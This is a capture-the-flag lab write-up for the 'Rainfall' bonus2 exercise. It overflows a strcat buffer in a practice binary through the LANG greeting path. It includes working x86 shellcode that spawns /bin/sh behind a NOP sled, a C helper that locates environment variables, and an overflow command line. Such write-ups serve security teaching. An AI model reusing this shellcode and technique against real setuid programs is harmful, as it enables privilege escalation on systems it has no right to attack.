# Bonus2

Let's see to the binary

![](/Users/a19523132/school/Rainfall/bonus2/Ressources/img/bonus2_launch.png)

The binary make greeting us. Let's use [gdb](Ressources/gdb.md) to understand what's going on. 

We need to exploit `strcat` once again to trigger a Shellcode. 
This program is using a `LANG` environment variable to greet us in the corresponding language if we input two arguments. 
`fi` and `nl` are recognized along with english being the default one. 
We must use either `fi` or `nl` to overflow as the greeting message in english is too short. 
Using `nl` we find out that offset is equal to `23` bytes.

All we have to do is set `LANG` to `nl` and exporting a Shellcode into our environment

    export LANG="nl"
    export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`

And launch the simple program

    #include <cstdio>
    #include <cstdlib>
    
    int main(int ac, char **av)
    {
        printf("env address at %p\n", getenv(av[1]));
        return (0);
    }

Then we should make an overflow

`./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 23 + '\xXX\xXX\xXX\xXX'[::-1]")`

![](/Users/a19523132/school/Rainfall/bonus2/Ressources/img/bonus3.png)
